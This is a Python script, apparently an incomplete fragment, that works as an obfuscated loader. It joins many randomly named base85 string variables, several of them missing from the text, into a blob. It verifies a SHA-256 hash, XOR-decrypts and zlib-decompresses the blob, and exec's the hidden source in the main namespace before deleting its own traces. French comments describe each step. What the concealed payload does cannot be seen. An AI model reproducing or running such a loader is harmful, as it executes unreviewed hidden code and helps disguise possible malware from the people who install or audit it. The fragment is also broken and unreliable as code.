_casQGrxPZGv6s_ = '86x;gUB0MK%e-HOt9A4;4KQJyhaB-O&KDZdbU+(9DpQ@0DW2516{dt`Ey(+76UC&y8T+bh^uG5+'
_cxtsFSb9ujax7N = 'sLZmd3%_z;ogM3&{dM(~07H4){HZW*L)L)tw*bg_nKJi4d1;uNpA#M}1TF*R+B2I+@lm*z;i--('
_cinINm3ngUzKGu = '*vQRe7O~vnJ}RE2`T@hxck3B>TW`zn3(QU<bMjlOs}geRVgEoeP<gO=;h@#=?Mc|cV(t?&FN9>D'
_cxDLZAtwEBTVLa = 'pU4q<&-p&ud!wZm+~%v-WXm84eAs+l{67x;CDr4pqX3904YBRO!$NL~RF(G*6V`QXmq*tR>FU%{'
_ctcZoCJXZMKfCZ = ';M~l7&*)PRGQofVJ44AScPVs&9nsklaSdaf%;Ne0P?Y2=YHM%GA=K%v1<x?8&S8fye48G%I_+X)'
_ctmYvjsjvHvQVk = 'qYK`o@xImye-VvC&{zfRLiGiGS0P)ue2lau%SF&Lw?qwtva5=YCH=S#9?r+W+M>J?Vva}gk)~kN'
_cgK98R0GB1cz5O = 'TGWK$^Ib3^(QJI8B9fdQ-#68MWbXW~EvAzcMtV`w!B`uE?*dLaBRSbnIi`sE;-R)NCpr-`fR1Zm'
_c_19Xgii_xVok_ = 'BxJ`Zb3z8M-m!&fV+IV~pNH8(m-t688Dpoqu4eJLn3=Pzs<IKD`G%X%1KpKYcv|Wv+;NCHA9Kpk'
_cohgWTq5wtPfwX = '_{!O|BYSP1(%pIMa{fiHCB>W64z@;lSGJ$d@#aTZ5%Z3LCiC!+I9O|9=_<7+3YA~WA)s*$Z32V)'
_cfC09whk6aLRbd = 'k`YsA`uKNYNb00Pww{fbIHAt6t>!GMsW~WkO_<$y>yk4@GNnQuR3&-mS~nQ`<(yW9TbNZ(AH%gg'
_c_eKYOIlxJEZ1L = 'X<Jx>XjxuMw4(f8DAYHe$8R;|NTl)~r{nA|xGuHV{DBN2w%ZLXCvIPj)1zvbq(6z3P_V`Yq)C92'
_cn0pDAJyjRudKK = 'Rq(y-BLqo#nTL{@`#_Ga(e|rJOEE#&`b|*tTLYDLb0+IZ#`a@fG!X@%&oqco`83Ud>D~9<heMCh'
_ciRbKl1GhpXZ2a = '^D`JB6IpvHM0iQC$Do&Xfdd;egE<KhxYueVFtuCe=CBj*k_|AWJs;@8)GN1>g{-$CaN}vcQ1fl>'
_cfkMeyBU_jU7ih = 'a|Yj%A(&QH{D#l1K11E7sSxwoGc%o<$z8rC{k!0E6P(;P?D}Rk-%BRw#2fI^21<dBh~uS!9%JY0'
_cp9EJXQE2glICI = '-tpqoq9_%Q*_`~kV|P!9MQbTwC>me~fi}Gxlg)<km&!YqlAJjsi{3Jl3|~K|q>p=-^UcyD?eh&!'
_cqoCTxWOiHQ_qh = 'v^ylg8qy}pCEFA>6;CXnR-?=_iAq>d?M5A==y@bT)uf*Pn!PTa4WyvVZfp!~@mwZVOVeYkejskX'
_cmqcWc10zZjHtv = 'kio8c{DR4KD6pKTXtDTXx$`}n=<*;T60@2R=-we@$cMK(Jn^cunxYSn!<*=5M5y6YHU4<tTS+}N'
_cqhJp294j2jO2r = 'P*1$zJpX8Lx@)v)EKw>1DSr#CX?J0Y*BkY*oT+<Al|oed=YApWlDgZ8_?SPf?unNuQ3B<`Q{NMX'
_czVgGdvd0lAo1E = 'Nec;KGxccWkV~U<Qm0l#aTU<DXIb}-=ULZbi8ziY!LJ^%Vx1Od>j~|P;_B2)F#EWt(N*S&IL+tp'
_cxSilEzWr9yE2E = 'kQq)VE1te8T`kaD|E)W7KCCiaFRqrR81$b_t#vzA3t3yRo{ArNrXTjeJ_ep^YRg>QfmNgRD63&F'
_cyaAGrlvpBmpCe = 'Br5n2%A8N%&k5horc7i0F~bY-_NZ?h0U>ZwgS>F7&hK@a)zEWxkw<!HdM@NtFPoY^p@7GHy>ZHr'
_ccunmQv48kE0l5 = '%%Z?aZPlb~R|O)9V%!+-CFH2)6(kCu3~|49?vFU_udb{v&6lAY^z#HJppl9j7dQtA6krQiZCTCS'
_cjwyReGvJbRlWS = 'IH#@RXU!wm;AST?idyF6nGZJ9pQo!E)$LQKI|pG^ko<pvk(=3gItq4wp~BSP_mHpu!YT^?*XP9z'
_c_eIZ0X0A3xD6j = '4acWGhQ1Ti;ye2trusOkuw_SIuYDo^Gjzx^p8c;tEqYe|k+;Xdq}J&@Z73Mmdpy<@VfZ3?Wv-dh'
_cv5WnojmaeSBjW = 'Got`}tdZL3_NSku(rr?LwUuhk8%x&A?jM>FpZ>h6mtlKO2ptO0rS8WrcVoL~EWi66`@90@?Hvof'
_cpV_OX__FV3JLZ = '`<kEXyYC)4zV|#rY8j~6eTQCt*()amFZuB'

_pe_Wgr_q5odY2v = __import__('base64').b85decode(_cfA7nCOdeYVK1N + _cpAVFkQ2j1MkQm + _cdggaiwdFNXxrk + _c_xLMr4cGWCPLk + _crSeFEHHMn3hzR + _ckYqz6TABIyzOP + _ckkRfQdNTP9PnE + _cdZVdyP6udrGH6 + _cbTXSl4Gd2ImvI + _ciblEKTgxOVV_z + _co0ceGgIKR_tTv + _cikhbea_24bgMY + _chTqgUXhGfy1qx + _cc_Fpp6fU_q32o + _cpzutVDbtQMnVQ + _cz2KJqsD72qRNA + _cb5JexCkpGm5sq + _ceqgvtvaaJJ25L + _ctZSEKCobUv_7P + _cbWixm7XW2wBML + _cxhK77zkEbycVu + _cobBMEVEYZrSU1 + _ccnC8XvXCN8aLX + _cqK39vCOkxgEXU + _cd5rG5RJiWYQq1 + _cikQH2vah1KRwu + _cfZVgDTilL2Esp + _cnbXsEbSV6n3qr + _cgMb11WYgPYAVx + _clKBVPEBDj4y9B + _cc7Whyz1dxZqB4 + _cwlebvrKr26Dxa + _cdOufeSwXhV5vl + _coeBHtdxmY9jnl + _chNbgY_OiaEW42 + _czSW2JnDdyIwfW + _cfZqRZuKfYDfXN + _chVFp2U1zIXAUK + _cjDhAPdTDNvgU0 + _ce1V6qd4osi1P_ + _ceT7hvWaD4YDKV + _cvZfmRwtP_gJtI + _c_bz4BYVU8v4M9 + _carYPp4_30WcZj + _clX6J2Gb7_yLiv + _cvKfFvcLZHa3rh + _chzeFjduPHv0Na + _cjZiXhc6KroyKj + _caoyAtRUKgt62K + _ctLdjaNvl0Hlcj + _cnHwptkndjvUcf + _cucJCvjsCywBGB + _cqmGuBwQ2vLrII + _cmSR6HGCMxEryM + _clJzgq5uyd8hLA + _cicgVD3FsmyQHz + _cmz4Bk2IdZUlMe + _cxM1H0Y3Txgl5q + _ctAZjFkVQ2M1Iw + _clpzNwgEveLH1F + _cfILUis6MXDclA + _cgoGhTRmYcRe9U + _ceNYVK_J2JV6Dl + _clg4mx_u4hQkt3 + _cqc8bpncQjnvCv + _cmBfRT_cF0zNKJ + _cnz9iGJ9vNQ41X + _ciCJbSCdSMEks7 + _cnHRwBTIJuIXs7 + _cl7amRdUDKxED3 + _ccCucNHZs4tmOd + _crfJ0Ri2aj4fFO + _cxY_CCMIluHCiY + _couoNUd0Pq3LjZ + _cuJC3_fhrLm819 + _co3sx4nrOdYsHN + _cuUYz1Ssaf0kkP + _clreWhmHWdt3qa + _cwSJfc6SbfpGi8 + _cwHBFx68yvh2Fl + _cfleaaPLTNtZ3Q + _ca_aW51lhSJ8tN + _cuUI4p_bmY7ohM + _cqKVOWqkehFJrC + _cy_zqtX5fhHQqK + _cvXCpGqcm57cvC + _ca8jVWxCRy8GYC + _cpfXcXmjIn3fB0 + _cr9RL3OHcshGNv + _cjT5fXhQ2J3bpA + _cl0lGFSzROCShz + _cyewxKbsyzU58a + _cgJFpj358_MjTg + _colHEybSpIG0p3 + _ch6SO1xW44JQFU + _ccxHdDNhMOaEwG + _cg8KYlEqqbRr8H + _coI07PSP7VmbNr + _cowkCxE8rfEzgs + _c_fCM98K2Tg7M4 + _cjV2Nj8esek2fm + _caljWt1isY08bm + _cxki8trazXOMR8 + _cx4SOHB5Ywr70h + _cyew9AAO0SN1DI + _cdguNbstdLLxrP + _cotIjLpHfmIuQR + _caOLl7lp3vHn7S + _csUF9MxZTuHrnP + _ciIyAF9WS8_Z8c + _chg91vQ8c6g5Kd + _chtEkQif1rD5Yb + _ctPOTRG9H8hz05 + _ca7avfat8ujClI + _csCJOzSX5ATnYs + _cceoaDrKDdadFp + _cohwGUOs8w1Tju + _ccFWBLW_lBfJjc + _crpRo2VHKDi_3i + _cqRmAx02WLmKtJ + _ce_LcIKE000dQc + _chg8CPo1rCswjV + _ctL1PCUFZ1KKSc + _csIYeb67z8oeHf + _cvjR27ZZJcYXY0 + _chtbu7VWQtIw5W + _chcAFWEUoLFyNm + _chsFzV0UsMG58l + _cfMdmqVTo1e93c + _cfedFWJosg8y8D + _czEdt_3ffZ3NKd + _cb6W5gyING_s3J + _ccjbxJlwsCdl_a + _csyBkyaiJDr09d + _cim4hYZE9U3_Ak + _cfVCyzdhHOZlBl + _clsj5P9hXbu6yE + _cvR1b8qj12tAi8 + _czBWHKnSatE3bb + _cc2ol7dJCS4Fff + _cd3WmjNKAXenBj + _csgyzFwKhqy1W1 + _culKqE8KYDpsj4 + _cnwoJXidKjserU + _cdJ6_xA9dExNSQ + _cwgpvc3xUErdrA + _cxd3geJsrQIeKp + _cq9z2gxLFUzrxO + _caDFdBYxYGJvhR + _c_iyI3dRzbULiK + _clZWebNSgwou0A + _cfFk5NT0vDALv6 + _ck5Y_t3Shg_zGV + _crIZtX_14batXC + _casQGrxPZGv6s_ + _cxtsFSb9ujax7N + _cinINm3ngUzKGu + _cxDLZAtwEBTVLa + _ctcZoCJXZMKfCZ + _ctmYvjsjvHvQVk + _cgK98R0GB1cz5O + _c_19Xgii_xVok_ + _cohgWTq5wtPfwX + _cfC09whk6aLRbd + _c_eKYOIlxJEZ1L + _cn0pDAJyjRudKK + _ciRbKl1GhpXZ2a + _cfkMeyBU_jU7ih + _cp9EJXQE2glICI + _cqoCTxWOiHQ_qh + _cmqcWc10zZjHtv + _cqhJp294j2jO2r + _czVgGdvd0lAo1E + _cxSilEzWr9yE2E + _cyaAGrlvpBmpCe + _ccunmQv48kE0l5 + _cjwyReGvJbRlWS + _c_eIZ0X0A3xD6j + _cv5WnojmaeSBjW + _cpV_OX__FV3JLZ)
if __import__('hashlib').sha256(_pe_Wgr_q5odY2v).hexdigest() != 'adec1c08481601fd1da221e4a7a932b47476fe8459482baaa990b98c352ec9cb':
    __import__('sys').exit(1)
_xuY23FcyoUR5LF = bytes([38, 50, 81, 89, 163, 40, 157, 142, 71, 220, 3, 8, 81, 96, 71, 213, 88, 129, 217, 84, 66, 137, 36, 97, 55, 66, 16])
_fkhQWU69a3p_5tP = bytes([103, 164, 254, 52, 9, 59, 195, 16, 217, 135, 108, 197, 97, 76, 154, 131, 211, 187, 64, 118, 44, 42, 86, 7, 108, 4, 14])

def _fxqQN4HD0u4sGEI(_bf9YuyGOsH4KvO, _kwrrUpfIXCAhrm):
    return bytes(_bf9YuyGOsH4KvO[_iy_56Z1AVv4tew] ^ _kwrrUpfIXCAhrm[_iy_56Z1AVv4tew % len(_kwrrUpfIXCAhrm)] for _iy_56Z1AVv4tew in range(len(_bf9YuyGOsH4KvO)))

def _fdq8UyD1P_lpvHU(_tjORvKLwKgcTaI):
    import zlib
    return zlib.decompress(_tjORvKLwKgcTaI) # Un seul niveau de zlib ici pour simplifier

def _fei5Z0hG_XjGTNb():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xl6s4JwKNiLtro = _fxqQN4HD0u4sGEI(_pe_Wgr_q5odY2v, _xuY23FcyoUR5LF)
    # 2. Décompression Zlib
    _d_TOW8Qq_4RhK9 = _fdq8UyD1P_lpvHU(_xl6s4JwKNiLtro)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_TOW8Qq_4RhK9.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _naGT5XvLYWVr15 = _main.__dict__
    _naGT5XvLYWVr15.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _naGT5XvLYWVr15)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fei5Z0hG_XjGTNb()
try:
    del _fxqQN4HD0u4sGEI, _fdq8UyD1P_lpvHU, _fei5Z0hG_XjGTNb
    del _pe_Wgr_q5odY2v, _xuY23FcyoUR5LF, _fkhQWU69a3p_5tP
except:
    pass
